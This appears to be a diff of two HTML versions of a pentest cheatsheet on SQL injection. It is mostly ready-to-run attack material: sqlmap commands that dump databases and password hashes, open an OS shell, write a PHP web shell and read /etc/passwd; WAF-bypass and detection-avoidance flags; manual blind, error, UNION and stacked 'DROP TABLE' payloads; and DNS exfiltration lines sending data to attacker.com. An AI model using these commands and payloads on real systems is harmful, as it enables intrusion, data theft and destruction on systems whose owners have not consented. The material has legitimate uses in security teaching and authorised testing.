-</span></span><span class="line"><span class="cl"><span class="c1">## File read:</span>
-</span></span><span class="line"><span class="cl">sqlmap -r req.txt --file-read<span class="o">=</span>/etc/passwd
-</span></span></code></pre></div><p>What works per DB:</p>
-<ul>
-<li><strong>MySQL</strong>: needs <code>FILE</code> privilege, often available for root. <code>SELECT INTO OUTFILE</code>, UDF if <code>secure_file_priv</code> allows.</li>
-<li><strong>PostgreSQL</strong> ≥ 9.3: <code>COPY FROM PROGRAM</code> = direct RCE, no extra setup.</li>
-<li><strong>MSSQL</strong>: <code>xp_cmdshell</code> if enabled, sqlmap re-enables it if config rights present.</li>
-<li><strong>Oracle</strong>: harder, needs DBA privs for <code>DBMS_SCHEDULER</code> or Java stored proc.</li>
-</ul>
-<h2 id="v-manual-injection-patterns" data-heading-permalink="true"><span class="heading-content">v. Manual injection patterns</span>
-    <a class="heading-permalink" href="#v-manual-injection-patterns" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>When sqlmap fails (custom WAF, weird encoding, multi-step), manual is the way. The base patterns to know:</p>
-<h3 id="boolean-blind" data-heading-permalink="true"><span class="heading-content">Boolean blind</span>
-    <a class="heading-permalink" href="#boolean-blind" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>Compare two queries: one that should be true, one false. Different responses confirm injection:</p>
-<pre tabindex="0"><code>GET /search?id=1 AND 1=1
+</code></pre><p>Burp Scanner (passive + active audit) catches obvious cases. For mass-fuzz across many endpoints:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sqlmap -m urls.txt --batch --random-agent --level<span class=o>=</span><span class=m>2</span> --risk<span class=o>=</span><span class=m>1</span>
+</span></span></code></pre></div><h2 id=iii-sqlmap-the-workhorse data-heading-permalink=true><span class=heading-content>iii. sqlmap, the workhorse</span>
+<a class=heading-permalink href=#iii-sqlmap-the-workhorse aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Default and most common patterns:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## Single URL with GET parameter:</span>
+</span></span><span class=line><span class=cl>sqlmap -u <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>/product?id=1&#34;</span> --batch
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>## POST request body:</span>
+</span></span><span class=line><span class=cl>sqlmap -u <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>/login&#34;</span> --data <span class=s1>&#39;user=admin&amp;pass=x&#39;</span> --batch
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>## JSON body:</span>
+</span></span><span class=line><span class=cl>sqlmap -u <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>/api/search&#34;</span> --data <span class=s1>&#39;{&#34;q&#34;:&#34;test&#34;}&#39;</span> --headers<span class=o>=</span><span class=s1>&#39;Content-Type: application/json&#39;</span> --batch
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>## With cookie / session:</span>
+</span></span><span class=line><span class=cl>sqlmap -u <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>/profile?id=1&#34;</span> --cookie <span class=s1>&#39;PHPSESSID=abc; auth=xyz&#39;</span> --batch
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>## Header injection:</span>
+</span></span><span class=line><span class=cl>sqlmap -u <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>/&#34;</span> --headers<span class=o>=</span><span class=s1>&#39;X-Forwarded-For: 1*&#39;</span> --batch
+</span></span><span class=line><span class=cl><span class=c1>## (* marks the injection point)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>## Test all parameters (level=5 risk=3 = maximum, slow):</span>
+</span></span><span class=line><span class=cl>sqlmap -u <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>/api?id=1&amp;sort=name&#34;</span> --batch --level<span class=o>=</span><span class=m>5</span> --risk<span class=o>=</span><span class=m>3</span>
+</span></span></code></pre></div><p>Save the request from Burp and feed it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## In Burp: right-click request -&gt; Copy to file -&gt; request.txt</span>
+</span></span><span class=line><span class=cl>sqlmap -r request.txt --batch
+</span></span><span class=line><span class=cl>sqlmap -r request.txt --batch --level<span class=o>=</span><span class=m>5</span> --risk<span class=o>=</span><span class=m>3</span>
+</span></span></code></pre></div><p>Useful flags:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>--current-db                <span class=c1>## what DB are we in</span>
+</span></span><span class=line><span class=cl>--current-user
+</span></span><span class=line><span class=cl>--users                     <span class=c1>## DB user list</span>
+</span></span><span class=line><span class=cl>--passwords                 <span class=c1>## DB user hashes</span>
+</span></span><span class=line><span class=cl>--privileges
+</span></span><span class=line><span class=cl>--dbs                       <span class=c1>## list databases</span>
+</span></span><span class=line><span class=cl>-D somedb --tables
+</span></span><span class=line><span class=cl>-D somedb -T users --columns
+</span></span><span class=line><span class=cl>-D somedb -T users --dump
+</span></span><span class=line><span class=cl>--dump-all --exclude-sysdbs
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>--technique<span class=o>=</span>BEUSTQ          <span class=c1>## B=boolean, E=error, U=union, S=stacked, T=time, Q=inline</span>
+</span></span><span class=line><span class=cl>--dbms<span class=o>=</span>mysql                <span class=c1>## skip DBMS detection if known</span>
+</span></span><span class=line><span class=cl>--threads<span class=o>=</span><span class=m>10</span>                <span class=c1>## parallel requests</span>
+</span></span><span class=line><span class=cl>--prefix<span class=o>=</span><span class=s1>&#39;&#34; AND&#39;</span> --suffix<span class=o>=</span><span class=s1>&#39;-- -&#39;</span>   <span class=c1>## manual context override</span>
+</span></span><span class=line><span class=cl>--tamper<span class=o>=</span>space2comment,charunicodeencode    <span class=c1>## WAF bypass tampers</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>--proxy<span class=o>=</span>http://127.0.0.1:8080
+</span></span><span class=line><span class=cl>--random-agent
+</span></span><span class=line><span class=cl>--delay<span class=o>=</span><span class=m>2</span> --timeout<span class=o>=</span><span class=m>15</span>      <span class=c1>## slow it down to avoid detection / rate limits</span>
+</span></span></code></pre></div><p>When sqlmap finds an injection but can&rsquo;t dump:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sqlmap -r req.txt --technique<span class=o>=</span>T --time-sec<span class=o>=</span><span class=m>3</span> --threads<span class=o>=</span><span class=m>1</span>     <span class=c1>## time-based often slower but works</span>
+</span></span><span class=line><span class=cl>sqlmap -r req.txt --string<span class=o>=</span><span class=s2>&#34;welcome&#34;</span>     <span class=c1>## tell sqlmap what a successful response looks like</span>
+</span></span><span class=line><span class=cl>sqlmap -r req.txt --not-string<span class=o>=</span><span class=s2>&#34;error&#34;</span>
+</span></span></code></pre></div><h2 id=iv-sqlmap-to-rce data-heading-permalink=true><span class=heading-content>iv. sqlmap to RCE</span>
+<a class=heading-permalink href=#iv-sqlmap-to-rce aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>When you have admin-level DB access, sqlmap automates the foothold:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>## OS shell (uses DBMS-specific tricks):</span>
+</span></span><span class=line><span class=cl>sqlmap -r req.txt --os-shell
+</span></span><span class=line><span class=cl><span class=c1>## File write (PHP web shell into webroot):</span>
+</span></span><span class=line><span class=cl>sqlmap -r req.txt --file-write<span class=o>=</span>/tmp/sh.php --file-dest<span class=o>=</span>/var/www/html/sh.php
+</span></span><span class=line><span class=cl><span class=c1>## File read:</span>
+</span></span><span class=line><span class=cl>sqlmap -r req.txt --file-read<span class=o>=</span>/etc/passwd
+</span></span></code></pre></div><p>What works per DB:</p><ul><li><strong>MySQL</strong>: needs <code>FILE</code> privilege, often available for root. <code>SELECT INTO OUTFILE</code>, UDF if <code>secure_file_priv</code> allows.</li><li><strong>PostgreSQL</strong> ≥ 9.3: <code>COPY FROM PROGRAM</code> = direct RCE, no extra setup.</li><li><strong>MSSQL</strong>: <code>xp_cmdshell</code> if enabled, sqlmap re-enables it if config rights present.</li><li><strong>Oracle</strong>: harder, needs DBA privs for <code>DBMS_SCHEDULER</code> or Java stored proc.</li></ul><h2 id=v-manual-injection-patterns data-heading-permalink=true><span class=heading-content>v. Manual injection patterns</span>
+<a class=heading-permalink href=#v-manual-injection-patterns aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>When sqlmap fails (custom WAF, weird encoding, multi-step), manual is the way. The base patterns to know:</p><h3 id=boolean-blind data-heading-permalink=true><span class=heading-content>Boolean blind</span>
+<a class=heading-permalink href=#boolean-blind aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>Compare two queries: one that should be true, one false. Different responses confirm injection:</p><pre tabindex=0><code>GET /search?id=1 AND 1=1
 GET /search?id=1 AND 1=2
-</code></pre><p>Extract data char-by-char via comparison:</p>
-<pre tabindex="0"><code>?id=1 AND SUBSTRING((SELECT db_name()),1,1)=&#39;a&#39;
+</code></pre><p>Extract data char-by-char via comparison:</p><pre tabindex=0><code>?id=1 AND SUBSTRING((SELECT db_name()),1,1)=&#39;a&#39;
 ?id=1 AND ASCII(SUBSTRING((SELECT db_name()),1,1))&gt;97
-</code></pre><h3 id="time-based-blind" data-heading-permalink="true"><span class="heading-content">Time-based blind</span>
-    <a class="heading-permalink" href="#time-based-blind" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>When no visible difference, use sleep functions per DB:</p>
-<pre tabindex="0"><code>MySQL:      SLEEP(5)              ## also BENCHMARK(5000000,MD5(&#39;a&#39;))
+</code></pre><h3 id=time-based-blind data-heading-permalink=true><span class=heading-content>Time-based blind</span>
+<a class=heading-permalink href=#time-based-blind aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>When no visible difference, use sleep functions per DB:</p><pre tabindex=0><code>MySQL:      SLEEP(5)              ## also BENCHMARK(5000000,MD5(&#39;a&#39;))
 PostgreSQL: pg_sleep(5)
 MSSQL:      WAITFOR DELAY &#39;0:0:5&#39;
 Oracle:     dbms_pipe.receive_message((&#39;a&#39;),5)
 SQLite:     CASE WHEN ... THEN randomblob(100000000) ELSE 0 END
-</code></pre><h3 id="error-based" data-heading-permalink="true"><span class="heading-content">Error-based</span>
-    <a class="heading-permalink" href="#error-based" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>Force a specific error that includes data:</p>
-<pre tabindex="0"><code>MySQL:      AND extractvalue(1,concat(0x7e,(SELECT version())))
+</code></pre><h3 id=error-based data-heading-permalink=true><span class=heading-content>Error-based</span>
+<a class=heading-permalink href=#error-based aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>Force a specific error that includes data:</p><pre tabindex=0><code>MySQL:      AND extractvalue(1,concat(0x7e,(SELECT version())))
 PostgreSQL: AND 1=cast((SELECT version()) as int)
 MSSQL:      AND 1=convert(int,(SELECT @@version))
-</code></pre><h3 id="union-based" data-heading-permalink="true"><span class="heading-content">UNION-based</span>
-    <a class="heading-permalink" href="#union-based" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>Match column count and types, then read data:</p>
-<pre tabindex="0"><code>?id=1 ORDER BY 1--+    ## ok
+</code></pre><h3 id=union-based data-heading-permalink=true><span class=heading-content>UNION-based</span>
+<a class=heading-permalink href=#union-based aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>Match column count and types, then read data:</p><pre tabindex=0><code>?id=1 ORDER BY 1--+    ## ok
 ?id=1 ORDER BY 9--+    ## error = 8 columns
 ?id=1 UNION SELECT 1,2,3,4,5,6,7,8--+
 ?id=-1 UNION SELECT 1,table_name,3,4,5,6,7,8 FROM information_schema.tables
-</code></pre><p>Note: <code>-1</code> for the original id forces the first part of the UNION to be empty, only your row returns.</p>
-<h2 id="vi-waf--filter-bypass" data-heading-permalink="true"><span class="heading-content">vi. WAF / filter bypass</span>
-    <a class="heading-permalink" href="#vi-waf--filter-bypass" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Quick tampers when sqlmap reports a WAF blocking payloads:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sqlmap -r req.txt --tamper<span class="o">=</span>space2comment,between,charunicodeencode
-</span></span><span class="line"><span class="cl">sqlmap -r req.txt --tamper<span class="o">=</span>randomcase,charencode,space2hash
-</span></span><span class="line"><span class="cl"><span class="c1">## List all tampers:</span>
-</span></span><span class="line"><span class="cl">sqlmap --list-tampers
-</span></span></code></pre></div><p>Common manual bypass tricks:</p>
-<ul>
-<li>Comments to break keyword detection: <code>UNI/**/ON SEL/**/ECT</code></li>
-<li>Case randomization: <code>uNiOn sElEcT</code></li>
-<li>URL-encoded spaces (<code>%20</code>), tabs (<code>%09</code>), newlines (<code>%0a</code>, <code>%0b</code>, <code>%0c</code>, <code>%0d</code>)</li>
-<li>Inline comments split keywords in MySQL: <code>UN/*!*/ION</code></li>
-<li>Backticks in MySQL: <code>SELECT 1 FROM </code>users``</li>
-<li><code>\N</code> instead of NULL</li>
-<li>Hex encoding for strings: <code>0x61646d696e</code> = <code>'admin'</code></li>
-<li>Stacked queries on supporting DBs (MSSQL, PostgreSQL): <code>'; DROP TABLE users--</code></li>
-</ul>
-<h2 id="vii-db-fingerprinting-one-liners" data-heading-permalink="true"><span class="heading-content">vii. DB fingerprinting one-liners</span>
-    <a class="heading-permalink" href="#vii-db-fingerprinting-one-liners" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>When testing manually, identify the backend first. Quick tests:</p>
-<pre tabindex="0"><code>## MySQL:    ?id=1 AND 1=1                works
+</code></pre><p>Note: <code>-1</code> for the original id forces the first part of the UNION to be empty, only your row returns.</p><h2 id=vi-waf--filter-bypass data-heading-permalink=true><span class=heading-content>vi. WAF / filter bypass</span>
+<a class=heading-permalink href=#vi-waf--filter-bypass aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Quick tampers when sqlmap reports a WAF blocking payloads:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sqlmap -r req.txt --tamper<span class=o>=</span>space2comment,between,charunicodeencode
+</span></span><span class=line><span class=cl>sqlmap -r req.txt --tamper<span class=o>=</span>randomcase,charencode,space2hash
+</span></span><span class=line><span class=cl><span class=c1>## List all tampers:</span>
+</span></span><span class=line><span class=cl>sqlmap --list-tampers
+</span></span></code></pre></div><p>Common manual bypass tricks:</p><ul><li>Comments to break keyword detection: <code>UNI/**/ON SEL/**/ECT</code></li><li>Case randomization: <code>uNiOn sElEcT</code></li><li>URL-encoded spaces (<code>%20</code>), tabs (<code>%09</code>), newlines (<code>%0a</code>, <code>%0b</code>, <code>%0c</code>, <code>%0d</code>)</li><li>Inline comments split keywords in MySQL: <code>UN/*!*/ION</code></li><li>Backticks in MySQL: <code>SELECT 1 FROM </code>users``</li><li><code>\N</code> instead of NULL</li><li>Hex encoding for strings: <code>0x61646d696e</code> = <code>'admin'</code></li><li>Stacked queries on supporting DBs (MSSQL, PostgreSQL): <code>'; DROP TABLE users--</code></li></ul><h2 id=vii-db-fingerprinting-one-liners data-heading-permalink=true><span class=heading-content>vii. DB fingerprinting one-liners</span>
+<a class=heading-permalink href=#vii-db-fingerprinting-one-liners aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>When testing manually, identify the backend first. Quick tests:</p><pre tabindex=0><code>## MySQL:    ?id=1 AND 1=1                works
 ## MySQL:    ?id=1 AND @@version           returns version in error
 ## PostgreSQL: ?id=1 AND version()=version()
 ## MSSQL:    ?id=1 AND @@SERVERNAME=@@SERVERNAME
 ## Oracle:   ?id=1 AND ROWNUM=ROWNUM
 ## SQLite:   ?id=1 AND sqlite_version()=sqlite_version()
-</code></pre><p>Or look at error messages - each DB has distinctive error syntax.</p>
-<h2 id="viii-nosql-hybrid-stacks" data-heading-permalink="true"><span class="heading-content">viii. NoSQL hybrid stacks</span>
-    <a class="heading-permalink" href="#viii-nosql-hybrid-stacks" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>When the app uses MongoDB / Couchbase / Elastic, sqlmap doesn&rsquo;t apply. Jump to [[WEB04 NoSQL Injection]].</p>
-<p>If unclear which type, try both:</p>
-<pre tabindex="0"><code>&#39;              → SQL error suggests SQL
+</code></pre><p>Or look at error messages - each DB has distinctive error syntax.</p><h2 id=viii-nosql-hybrid-stacks data-heading-permalink=true><span class=heading-content>viii. NoSQL hybrid stacks</span>
+<a class=heading-permalink href=#viii-nosql-hybrid-stacks aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>When the app uses MongoDB / Couchbase / Elastic, sqlmap doesn&rsquo;t apply. Jump to <a href=/cheatsheets/web/web04-nosql-injection/>WEB04 NoSQL Injection</a>
+.</p><p>If unclear which type, try both:</p><pre tabindex=0><code>&#39;              → SQL error suggests SQL
 {&#34;$ne&#34;:null}   → behaves like wildcard suggests NoSQL
-</code></pre><h2 id="ix-sql-injection-in-second-order-spots" data-heading-permalink="true"><span class="heading-content">ix. SQL Injection in second-order spots</span>
-    <a class="heading-permalink" href="#ix-sql-injection-in-second-order-spots" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>When the immediate response is clean but the data is used later:</p>
-<ul>
-<li>Registration form takes username, profile page later queries it</li>
-<li>Search history saved to DB, displayed on dashboard with another query</li>
-<li>Logging endpoints that re-query log data for analytics</li>
-</ul>
-<p>Test by storing a payload then triggering the second-stage query. sqlmap supports this:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sqlmap -r register.req --second-url <span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/profile/me&#34;</span> --batch
-</span></span></code></pre></div><h2 id="x-orm-specific-bugs" data-heading-permalink="true"><span class="heading-content">x. ORM-specific bugs</span>
-    <a class="heading-permalink" href="#x-orm-specific-bugs" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Even ORMs leak. Common patterns:</p>
-<ul>
-<li><strong>Hibernate HQL injection</strong>: <code>ORDER BY</code> clauses, raw query methods</li>
-<li><strong>Django QuerySet <code>extra()</code></strong> with user input</li>
-<li><strong>SQLAlchemy <code>text()</code></strong> with f-strings</li>
-<li><strong>Sequelize raw query</strong></li>
-</ul>
-<p>These look like ORM calls but pass user input to a raw query string somewhere. Search the source for <code>raw(</code> / <code>text(</code> / <code>executeSQL</code> / <code>query(</code> if you have code access.</p>
-<h2 id="xi-tricks-worth-knowing" data-heading-permalink="true"><span class="heading-content">xi. Tricks worth knowing</span>
-    <a class="heading-permalink" href="#xi-tricks-worth-knowing" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<h3 id="boolean-shortcut-via-0x-ascii" data-heading-permalink="true"><span class="heading-content">Boolean shortcut via 0x ascii</span>
-    <a class="heading-permalink" href="#boolean-shortcut-via-0x-ascii" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>For extracting one char at a time:</p>
-<pre tabindex="0"><code>AND ASCII(SUBSTRING(...,1,1)) BETWEEN 64 AND 96    ## upper case?
+</code></pre><h2 id=ix-sql-injection-in-second-order-spots data-heading-permalink=true><span class=heading-content>ix. SQL Injection in second-order spots</span>
+<a class=heading-permalink href=#ix-sql-injection-in-second-order-spots aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>When the immediate response is clean but the data is used later:</p><ul><li>Registration form takes username, profile page later queries it</li><li>Search history saved to DB, displayed on dashboard with another query</li><li>Logging endpoints that re-query log data for analytics</li></ul><p>Test by storing a payload then triggering the second-stage query. sqlmap supports this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sqlmap -r register.req --second-url <span class=s2>&#34;</span><span class=nv>$T</span><span class=s2>/profile/me&#34;</span> --batch
+</span></span></code></pre></div><h2 id=x-orm-specific-bugs data-heading-permalink=true><span class=heading-content>x. ORM-specific bugs</span>
+<a class=heading-permalink href=#x-orm-specific-bugs aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Even ORMs leak. Common patterns:</p><ul><li><strong>Hibernate HQL injection</strong>: <code>ORDER BY</code> clauses, raw query methods</li><li><strong>Django QuerySet <code>extra()</code></strong> with user input</li><li><strong>SQLAlchemy <code>text()</code></strong> with f-strings</li><li><strong>Sequelize raw query</strong></li></ul><p>These look like ORM calls but pass user input to a raw query string somewhere. Search the source for <code>raw(</code> / <code>text(</code> / <code>executeSQL</code> / <code>query(</code> if you have code access.</p><h2 id=xi-tricks-worth-knowing data-heading-permalink=true><span class=heading-content>xi. Tricks worth knowing</span>
+<a class=heading-permalink href=#xi-tricks-worth-knowing aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><h3 id=boolean-shortcut-via-0x-ascii data-heading-permalink=true><span class=heading-content>Boolean shortcut via 0x ascii</span>
+<a class=heading-permalink href=#boolean-shortcut-via-0x-ascii aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>For extracting one char at a time:</p><pre tabindex=0><code>AND ASCII(SUBSTRING(...,1,1)) BETWEEN 64 AND 96    ## upper case?
 AND ASCII(SUBSTRING(...,1,1)) BETWEEN 96 AND 128   ## lower case?
 ## Binary search down to exact char
-</code></pre><h3 id="out-of-band-exfiltration" data-heading-permalink="true"><span class="heading-content">Out-of-band exfiltration</span>
-    <a class="heading-permalink" href="#out-of-band-exfiltration" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>When in-band blind is too slow, exfil via DNS:</p>
-<pre tabindex="0"><code>MySQL:      LOAD_FILE(CONCAT(&#39;\\\\&#39;,(SELECT version()),&#39;.attacker.com\\x&#39;))
+</code></pre><h3 id=out-of-band-exfiltration data-heading-permalink=true><span class=heading-content>Out-of-band exfiltration</span>
+<a class=heading-permalink href=#out-of-band-exfiltration aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>When in-band blind is too slow, exfil via DNS:</p><pre tabindex=0><code>MySQL:      LOAD_FILE(CONCAT(&#39;\\\\&#39;,(SELECT version()),&#39;.attacker.com\\x&#39;))
 MSSQL:      EXEC master..xp_dirtree &#39;\\attacker.com\x&#39;
 Oracle:     SELECT UTL_INADDR.get_host_address((SELECT version FROM v$instance)||&#39;.attacker.com&#39;)
 PostgreSQL: COPY (SELECT ...) TO PROGRAM &#39;nslookup attacker.com&#39;
-</code></pre><p>Set up an OAST listener with <a href="https://github.com/projectdiscovery/interactsh-client" target="_blank" rel="noopener noreferrer">interactsh</a>
- or Burp Collaborator.</p>
-<h3 id="test-stacked-queries-by-writing-then-reading" data-heading-permalink="true"><span class="heading-content">Test stacked queries by writing then reading</span>
-    <a class="heading-permalink" href="#test-stacked-queries-by-writing-then-reading" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>On MSSQL / PostgreSQL:</p>
-<pre tabindex="0"><code>&#39;; INSERT INTO temp VALUES(&#39;test&#39;)--
+</code></pre><p>Set up an OAST listener with <a href=https://github.com/projectdiscovery/interactsh-client target=_blank rel="noopener noreferrer">interactsh</a>
+or Burp Collaborator.</p><h3 id=test-stacked-queries-by-writing-then-reading data-heading-permalink=true><span class=heading-content>Test stacked queries by writing then reading</span>
+<a class=heading-permalink href=#test-stacked-queries-by-writing-then-reading aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><p>On MSSQL / PostgreSQL:</p><pre tabindex=0><code>&#39;; INSERT INTO temp VALUES(&#39;test&#39;)--
 ## Then read back via select. Confirms stacked queries work and gives RCE potential.
-</code></pre><h3 id="polyglot-for-unknown-dbs" data-heading-permalink="true"><span class="heading-content">Polyglot for unknown DBs</span>
-    <a class="heading-permalink" href="#polyglot-for-unknown-dbs" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<pre tabindex="0"><code>SLEEP(5)/*&#39; or SLEEP(5) or &#39;&#34;XOR(SLEEP(5))OR&#34;*/
-</code></pre><p>Triggers time delay on MySQL/PostgreSQL/MSSQL with one payload.</p>
-<h3 id="csrf-token-in-sqlmap" data-heading-permalink="true"><span class="heading-content">&ndash;csrf-token in sqlmap</span>
-    <a class="heading-permalink" href="#csrf-token-in-sqlmap" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h3>
-<p>For protected endpoints:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sqlmap -r req.txt --csrf-token<span class="o">=</span><span class="s2">&#34;csrf_token&#34;</span> --csrf-url<span class="o">=</span><span class="s2">&#34;</span><span class="nv">$T</span><span class="s2">/login&#34;</span>
-</span></span></code></pre></div><h2 id="xii-references" data-heading-permalink="true"><span class="heading-content">xii. References</span>
-    <a class="heading-permalink" href="#xii-references" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<ul>
-<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank" rel="noopener noreferrer">PortSwigger - SQL Injection cheat sheet</a>
- - best single page reference</li>
-<li><a href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener noreferrer">PortSwigger - SQL injection labs</a>
-</li>
-<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings - SQL Injection</a>
-</li>
-<li><a href="https://book.hacktricks.xyz/pentesting-web/sql-injection" target="_blank" rel="noopener noreferrer">HackTricks - SQL Injection</a>
-</li>
-<li><a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage" target="_blank" rel="noopener noreferrer">sqlmap user manual</a>
-</li>
-<li><a href="https://github.com/sqlmapproject/sqlmap/tree/master/tamper" target="_blank" rel="noopener noreferrer">sqlmap tamper scripts reference</a>
-</li>
-</ul>
-<h2 id="xiii-where-it-leads" data-heading-permalink="true"><span class="heading-content">xiii. Where it leads</span>
-    <a class="heading-permalink" href="#xiii-where-it-leads" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<ul>
-<li>Authentication bypass → straight into [[WEB02 Auth &amp; Session]] account takeover</li>
-<li>DB dump → cred reuse spray across all auth surfaces, see [[AD05 Password Spraying]] for the wider domain spray</li>
-<li>File write privilege → web shell → [[04 Initial Access]] (Linux) or [[W01 Recon &amp; Enum]] (Windows)</li>
-<li><code>xp_cmdshell</code> / <code>COPY FROM PROGRAM</code> → direct RCE</li>
-<li>Internal hosts mentioned in DB → pivot target list for [[Pivoting]]</li>
-</ul>
-
-        </div>
-
-        
-          <nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/web/web02-auth--session/">
-            <div class="cheatsheet-pager-copy">
-              <span class="cheatsheet-pager-label">Previous</span>
-              <span class="cheatsheet-pager-title">Auth &amp; Session</span>
-            </div>
-            <span class="cheatsheet-pager-arrow" aria-hidden="true">
-              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-    <path d="m12 19-7-7 7-7"></path>
-    <path d="M19 12H5"></path>
-  </svg>
-            </span>
-          </a><a class="cheatsheet-pager-link is-next" href="/cheatsheets/web/web04-nosql-injection/">
-            <div class="cheatsheet-pager-copy">
-              <span class="cheatsheet-pager-label">Next</span>
-              <span class="cheatsheet-pager-title">NoSQL Injection</span>
-            </div>
-            <span class="cheatsheet-pager-arrow" aria-hidden="true">
-              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-    <path d="m12 19-7-7 7-7"></path>
-    <path d="M19 12H5"></path>
-  </svg>
-            </span>
-          </a></nav>
-        
-      </div>
-    </div>
-  </article>
-  
-
-  </main>
-  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
-    <svg viewBox="0 0 24 24" aria-hidden="true">
-      <path d="M12 18V6"></path>
-      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
-    </svg>
-  </button>
-  <footer class="site-footer">
-  <p>&copy; 2026 JinPwn</p>
-</footer>
-
-</body>
-</html>
+</code></pre><h3 id=polyglot-for-unknown-dbs data-heading-permalink=true><span class=heading-content>Polyglot for unknown DBs</span>
+<a class=heading-permalink href=#polyglot-for-unknown-dbs aria-label="Link to this section"><span aria-hidden=true>#</span></a></h3><pre tabindex=0><code>SLEEP(5)/*&#39; or SLEEP(5) or &#39;&#34;XOR(SLEEP(5))OR&#34;*/
+</code></pre><p>Triggers time delay on MySQL/PostgreSQL/MSSQL with one payload.</p><h3 id=csrf-token-in-sqlmap data-heading-permalink=true><span class=heading-content>&ndash;csrf-token in sqlmap</span>
